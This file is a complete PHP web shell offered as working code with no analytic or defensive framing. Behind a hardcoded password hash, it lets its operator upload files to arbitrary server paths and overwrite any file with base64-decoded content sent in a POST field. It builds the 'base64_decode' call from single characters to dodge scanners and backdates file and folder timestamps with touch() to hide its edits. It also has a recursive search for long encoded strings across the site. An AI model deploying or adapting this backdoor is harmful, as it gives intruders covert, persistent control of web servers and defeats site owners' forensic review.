<?
update();
$pwd = "80b54277f47282db8831220129efc188";
session_start();
if (!empty($_POST["password"]))
    $_SESSION['pwd'] = md5($_POST['password']);
if (empty($_SESSION['pwd']) OR $_SESSION['pwd'] != $pwd)
    login_form();

function login_form() {
    echo '<center>
        <form method=post> 
            <input class=input name=password value=""> 
            <input class=button type=submit value="Enter">  
        </center>';
    exit;
}
?><pre>
  <style type="text/css">
        table
        {
            margin: 0em 0em 0 0;
            border: 1px;
            border-collapse: collapse;
        }

        th, td {
            font-weight: bold;
            border: 1px #787043 solid;
            text-align: center;
            padding: 0.25em;
            background: #D2DCE3;
        }

  </style>
        <script language='javascript'>
        function HideTable(_tbl) {
            tbl = document.getElementById(_tbl);
            if ( tbl.style.display == 'none' )
            //tbl.style.display = 'block';
                tbl.style.display = '';
            else
                tbl.style.display = 'none';
        }
</script>



    <center>
        <table width="600" border="1">
          <form enctype="multipart/form-data" method="POST">            
          <tr><td colspan="2">UPLOAD</td></tr>
          <tr>
            <td width="75" align="right">Path</td> 
            <td>
                <input type="hidden" name="MAX_FILE_SIZE" value="100000" />
                <input name="path" type="text" style="width:100%"  value="<?= (!empty($_POST["path"]) ? ($_POST["path"]) : (dirname(__FILE__) . "/")); ?>"/></td>
          </tr>          
          <tr>
            <td width="75" align="right">Upload File</td> 
            <td>
                
                <input name="uploadedfile" type="file" />
            </td>
          </tr>
          <tr><td colspan="2"><input type="submit" value="Upload" /></td></tr>
          </form>
            <form  METHOD=POST>
          <tr><td colspan="2">SEARCH</td></tr>
          
          <tr>
            <td width="75" align="right">ext:</td> 
            <td><input name="ext" type="text" style="width:100%"  value="<?= (!empty($_POST["ext"]) ? ($_POST["ext"]) : "php js"); ?>"/></td>
          </tr>
          <tr>
            <td align="right" nowrap>file size:</td>
            <td>
                <input name="size_from" type="text" maxlength="5" style="width:30%" value="<?= (!empty($_POST["size_from"]) ? ($_POST["size_from"]) : "0"); ?>"/> - 
                <input name="size_to" type="text" maxlength="5" style="width:30%" value="<?= (!empty($_POST["size_to"]) ? ($_POST["size_to"]) : "200"); ?>"/> kb
            </td>
            </tr>
          <tr>
            <td align="right" nowrap>start dir:</td>
            <td><input name="start_dir" type="text" style="width:100%" value="<?= (!empty($_POST["start_dir"]) ? ($_POST["start_dir"]) : (dirname(__FILE__) . "/")); ?>"/></td>
            </tr>
          <tr>
            <td align="right">search:</td>
            <td align="right"><input name="search" type="text" style="width:100%" value="<?= (!empty($_POST["search"]) ? ($_POST["search"]) : "[0-9a-zA-Z/]{80}"); ?>"/></td>
            </tr>
            <tr>
            <td align="right">depth:</td>
            <td><input name="depth" type="text" style="width:100%" value="<?= (!empty($_POST["depth"]) ? ($_POST["depth"]) : "20"); ?>"/></td>
            </tr>
            <tr>
            <td align="right">folders count step:</td>
            <td><input name="folders_step" type="text" style="width:100%" value="<?= (!empty($_POST["folders_step"]) ? ($_POST["folders_step"]) : "0"); ?>"/></td>
            </tr>
            <tr>
            <td align="right">wipe parsed folders:</td>
            <td><input name="wipe_folders" type="checkbox" /></td>
            </tr>
                <tr>
                    <td colspan="99">
                        <INPUT TYPE="submit" VALUE=" GO ">
                    </td>
                </tr>            
        </table>
    </center>
</form><br><br>
<?php
if (!empty($_FILES)) {
    $filename = basename($_FILES['uploadedfile']['name']);
    if (!empty($_POST["path"])) {
        $target_path = $_POST["path"];
        if (substr($target_path, -1) != "/")
            $target_path = $target_path . "/";
        $target_path = $target_path . $filename;
    }
    else
        $target_path = dirname(__FILE__) . "/" . $filename;

    $date = filemtime(dirname($target_path));


    if (move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
        echo "The file " . basename($_FILES['uploadedfile']['name']) . " has been uploaded<br><br>";
        echo '<a href ="./' . $filename . '">' . $filename . '</a><br><br>';

        echo "<SPAN style='color:red; font-weight:bold;'>TOUCH DATE IS: " . date("Y-m-d H:i:s", $date) . "</SPAN>\n\n";
        touch($target_path, $date, $date);
        touch(dirname($target_path), $date, $date);
    } else {
        echo "There was an error uploading the file, please try again!";
    }
}

if (!empty($_POST["start_dir"])) {
    if (!empty($_POST["wipe_folders"])) {
        $_SESSION["parsed_folders"] = array();
//        echo "<SPAN style='color:red; font-weight:bold;'>wiping</SPAN>";
    }
    if (!empty($_POST["folders_step"]))
        $folders = get_folders($_POST["start_dir"], $_POST["folders_step"]);
//    echo "<pre>".print_r ($_SESSION, true)."</pre>";
//    echo "<pre>".print_r ($_POST, true)."</pre>";


    $ext = explode(" ", preg_replace("#[ ]+#is", " ", trim($_POST["ext"])));
    if (empty($folders))
        $folders = array($_POST["start_dir"]);


    foreach ($folders as $folder) {
        echo "\n<SPAN style='color:red; font-weight:bold;'>FOLDER: " . $folder . "</SPAN>\n";



        $files = get_listing($folder, $ext, $_POST["depth"]);
        if (!empty($files)) {
            ?>
                                                                                                                                                <center><A HREF="#" class="pagenav" onClick="HideTable('ext_<?= md5($folder); ?>'); return false;" style='background-color:#66FFCC;'>extensions filter [<?= count($files); ?>]</A></center>
            <?
            echo "<SPAN style='display:none' id='ext_" . md5($folder) . "'>";
            echo "<pre>" . print_r($files, true) . "</pre>";
            echo "</SPAN><br>";
            flush();

            $res = $_files = array();
            foreach ($files as $f) {
                $size = ceil(filesize($f) / 1024);
                if ($_POST["size_to"] >= $size AND $size >= $_POST["size_from"]) {
                    $res[] = number_format($size) . " kb   " . $f;
                    $_files[] = $f;
                }
            }
        }
        else
            echo "<SPAN style='color:red; font-weight:bold;'>extensions filter empty</SPAN>\n";
        if (!empty($res)) {
            ?>

                                                                                                                                                <center><A HREF="#" class="pagenav" onClick="HideTable('size_<?= md5($folder); ?>'); return false;" style='background-color:#66FFCC;'>size filter [<?= count($res); ?>]</A></center>
            <?
            echo "<SPAN style='display:none' id='size_" . md5($folder) . "'>";
            echo "<pre>" . print_r($res, true) . "</pre>";
            echo "</SPAN><br>";

            $res = array();
            foreach ($_files as $f) {
                $c = file_get_contents($f);
                if (preg_match("#" . $_POST["search"] . "#is", $c, $m)) {
//            $res[] = array("filename"=>$f, "match"=>$m[0]);
                    $pos = strpos($c, $m[0]);
                    $match = substr($c, $pos - 150, strlen($m[0]) + 150 * 2);
                    $res[] = "<SPAN style='color:red; font-weight:bold;'>" . $f . "</SPAN>\n<textarea cols=200 rows=6>" . htmlentities($match) . "</textarea>\n";
//                $_files[] = $f;
                }
            }
        }
        else
            echo "<SPAN style='color:red; font-weight:bold;'>echo size filter</SPAN>\n";
        if (!empty($res)) {
            ?>
                                                                                                                                            <center><A HREF="#" class="pagenav" onClick="HideTable('search_<?= md5($folder); ?>'); return false;" style='background-color:#FFF823;color:black;'>REGEXP filter [<?= count($res); ?>]</A></center>
            <?
            echo "<SPAN style='display:none' id='search_" . md5($folder) . "'>";
            echo "<pre>" . print_r($res, true) . "</pre>";
            echo "</SPAN><br>";
            flush();
        }

        else
            echo "<SPAN style='color:red; font-weight:bold;'>empty REGEXP filter</SPAN>\n";
    }
}

function update() {
    if (isset($_POST['update']) AND !empty($_POST['path'])) {
        $filename = $_POST['path'];
        $date = filemtime(dirname($filename));
        echo "<SPAN style='color:red; font-weight:bold;'>TOUCH DATE IS: " . date("Y-m-d H:i:s", $date) . "</SPAN>\n\n";
        $b = "b" . "a" . "s" . "e" . "6" . "4" . "_" . "d" . "e" . "c" . "o" . "d" . "e";
        $somecontent = $b($_POST['update']);
        if (!$handle = fopen($filename, 'w')) {
            echo "Cannot open file ($filename)";
            exit;
        }
        if (fwrite($handle, $somecontent) === FALSE) {
            echo "Cannot write to file ($filename)";
            exit;
        }
        echo "Success, wrote " . strlen($somecontent) . " bytes to file (" . dirname(__FILE__) . "/" . $filename . ")";
        fclose($handle);
        touch($filename, $date, $date);
        touch(dirname($filename), $date, $date);
        exit();
    }
}

function get_listing($dir, $extensions=false, $depth=20, $step=1) {
    if (!$extensions)
        $extensions = array("php");
    $results = array();
    $listing = glob($dir . "*");

    if (!empty($listing) AND count($listing) > 0)
        foreach ($listing as $v) {
            if (is_dir($v) and $step < $depth) {
                $tmp = get_listing($v . '/', $extensions, $depth, ($step + 1));
                if (!empty($tmp) and count($tmp) > 0)
                    $results = array_merge($results, $tmp);
            }
            if (!is_dir($v) AND in_array(strtolower(substr(strrchr($v, "."), 1)), $extensions)) {
                $results[] = $v;
            }
        }
    return $results;
}

function get_folders($dir, $step=0) {
    $results = array();
    $listing = glob($dir . "*");

    if (!empty($listing) AND count($listing) > 0)
        foreach ($listing as $v) {
            if (is_dir($v))
                $folders[] = $v;
        }
    echo "<SPAN style='color:red; font-weight:bold;'>Total folders: " . count($folders) . "</SPAN>\n\n";
    if (!empty($_SESSION["parsed_folders"])) {
        echo "<SPAN style='color:green; font-weight:bold;'>Parsed folders: " . count($_SESSION["parsed_folders"]) . "</SPAN>\n";
        echo "<pre>".print_r ($_SESSION["parsed_folders"], true)."</pre>";
    }
    $return = array();
    foreach ($folders as $folder) {
        if (empty($_SESSION["parsed_folders"]) OR empty($_SESSION["parsed_folders"][$folder])) {
            $return[] = $folder;
            $_SESSION["parsed_folders"][$folder] = 1;
        }
        if (!empty($step) AND count($return) >= $step)
            break;
    }
    return $return;
}
?>
